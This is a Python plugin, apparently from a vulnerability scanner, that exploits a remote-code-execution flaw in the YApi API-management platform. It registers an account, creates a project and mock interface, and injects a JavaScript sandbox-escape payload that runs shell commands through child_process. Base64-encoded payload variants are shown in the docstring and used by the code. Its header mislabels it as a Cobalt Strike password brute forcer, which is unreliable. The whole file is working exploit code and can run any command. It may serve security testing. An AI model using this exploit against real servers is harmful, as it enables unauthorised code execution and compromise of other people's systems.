#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# description: Cobalt Strike Team Server Password Brute Forcer
# reference: https://github.com/Pear1y/yapi_rce

"""
Copyright (c) saucerman (https://saucer-man.com)
See the file 'LICENSE' for copying permission
"""

from urllib.parse import urlparse
import random, requests, json, base64
from plugin.target_parse import get_standard_url

requests.packages.urllib3.disable_warnings()

"""
Yapi 接口管理平台RCE漏洞

环境搭建
https://github.com/fjc0k/docker-YApi

Payload1: 已公开poc
const sandbox = this
const ObjectConstructor = this.constructor
const FunctionConstructor = ObjectConstructor.constructor
const myfun = FunctionConstructor('return process')
const process = myfun()
mockJson = process.mainModule.require("child_process").execSync("whoami && ps -ef").toString()

Payload2: 借助 Base64 编码指令, 某些情景(如反弹shell)利用不报错  √
const sandbox = this
const ObjectConstructor = this.constructor
const FunctionConstructor = ObjectConstructor.constructor
const Buffer =  new FunctionConstructor('return Buffer')
const process = new FunctionConstructor('return process')

command  = new Buffer('d2hvYW1p','base64').toString()  # Base64 编码后的 command
mockJson = new Buffer(process.mainModule.require("child_process").execSync(command).toString()).toString('base64')

Referer
https://mp.weixin.qq.com/s/H9pYITeuWbWycBRXSBxvkw
https://github.com/yumusb/Yapi_Rce/blob/main/exp.py
"""


class attack_yapi:
    def __init__(self, url):
        self.parse = urlparse(url)
        self.url = self.parse.scheme + "://" + self.parse.netloc
        self.ip = self.parse.netloc.split(":")[0]
        self.port = self.parse.port
        self.rand = self.random_str(16)
        self.get_headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36",
            "Connection": "close",
        }
        self.post_headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Content-Type": "application/json;charset=UTF-8",
            "Connection": "close",
        }
        self.proxy = {}
        # self.proxy = {"http": "http://127.0.0.1:8888"}

    def random_str(self, length):
        return "".join(random.sample('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', length))

    def exploit(self, session):
        try:
            data = {"email": "{}@qq.com".format(self.rand), "password": "{}".format(self.rand), "username": "{}".format(self.rand)}
            req = session.post(self.url + "/api/user/reg", headers=self.post_headers, data=json.dumps(data), verify=False, timeout=10, proxies=self.proxy)
            res = json.loads(req.text)
            if req.status_code == 200 and res.get("errcode") == 0:
                # get group_id
                req = session.get(self.url + "/api/group/get_mygroup", headers=self.get_headers, verify=False, timeout=10, proxies=self.proxy)
                res = json.loads(req.text)
                if req.status_code == 200 and res.get("errcode") == 0:
                    group_id = res.get("data").get("_id")
                    # project add, get project_id
                    data = {"name": "{}".format(self.rand), "group_id": "{}".format(group_id), "icon": "code-o", "color": "purple", "project_type": "private"}
                    req = session.post(self.url + "/api/project/add", headers=self.post_headers, data=json.dumps(data), verify=False, timeout=10, proxies=self.proxy)
                    res = json.loads(req.text)
                    if req.status_code == 200 and res.get("errcode") == 0:
                        project_id = res.get("data").get("_id")
                        # get catid
                        req = session.get(self.url + "/api/project/list?group_id={}&page=1&limit=10".format(group_id), headers=self.get_headers, verify=False, timeout=10, proxies=self.proxy)
                        res = json.loads(req.text)
                        if req.status_code == 200 and res.get("errcode") == 0:
                            list_id = res.get("data").get("list")[0].get("_id")
                            req = session.get(self.url + "/api/project/get?id={}".format(list_id), headers=self.get_headers, verify=False, timeout=10, proxies=self.proxy)
                            res = json.loads(req.text)
                            if req.status_code == 200 and res.get("errcode") == 0:
                                catid = res.get("data").get("cat")[0].get("_id")
                                # interface add, get interface id
                                data = {"method": "GET", "catid": "{}".format(catid), "title": "{}".format(self.rand), "path": "/{}".format(self.rand), "project_id": project_id}
                                req = session.post(self.url + "/api/interface/add", headers=self.post_headers, data=json.dumps(data), verify=False, timeout=10, proxies=self.proxy)
                                res = json.loads(req.text)
                                if req.status_code == 200 and res.get("errcode") == 0:
                                    interface_id = res.get("data").get("_id")
                                    return project_id, interface_id
        except Exception as msg:
            pass
        return None, None

    def code_injection(self, session, project_id, interface_id, command):
        try:
            command_b64 = bytes.decode(base64.b64encode(bytes(command, encoding='utf8')))
            mock_script = """const sandbox = this\r\nconst ObjectConstructor = this.constructor\r\nconst FunctionConstructor = ObjectConstructor.constructor\r\nconst Buffer =  new FunctionConstructor('return Buffer')()\r\nconst process = new FunctionConstructor('return process')()\r\ncmd  = new Buffer('{}','base64').toString()\r\n\r\nmockJson = new Buffer(process.mainModule.require(\"child_process\").execSync(cmd).toString()).toString('base64')""".format(command_b64)
            data = {"project_id": "{}".format(project_id), "interface_id": "{}".format(interface_id), "mock_script": mock_script, "enable": True}
            req = session.post(self.url + "/api/plugin/advmock/save", headers=self.post_headers, data=json.dumps(data), verify=False, timeout=10, proxies=self.proxy)
            res = json.loads(req.text)
            if req.status_code == 200 and res.get("errcode") == 0:
                req = session.get(self.url + "/mock/{}/{}".format(project_id, self.rand), headers=self.get_headers, verify=False, timeout=10, proxies=self.proxy)
                if req.status_code == 200:
                    return bytes.decode(base64.b64decode(bytes(req.text, "utf-8")))
        except:
            pass

    def del_info(self, session, project_id, interface_id):
        # del interface
        data = {"id": interface_id}
        session.post(self.url + "/api/interface/del", headers=self.post_headers, data=json.dumps(data), verify=False, timeout=10, proxies=self.proxy)
        # del project
        data = {"id": project_id}
        session.post(self.url + "/api/project/del", headers=self.post_headers, data=json.dumps(data), verify=False, timeout=10, proxies=self.proxy)

    def verify_yapi(self, session):
        try:
            command = "echo {}".format(self.rand)
            project_id, interface_id = self.exploit(session)
            if project_id is not None:
                res = self.code_injection(session, project_id, interface_id, command)
                self.del_info(session, project_id, interface_id)
                if self.rand in res:
                    return True
        except:
            pass
        return False


def poc(url):
    url = get_standard_url(url)
    attack = attack_yapi(url)
    s = requests.Session()
    return attack.verify_yapi(s)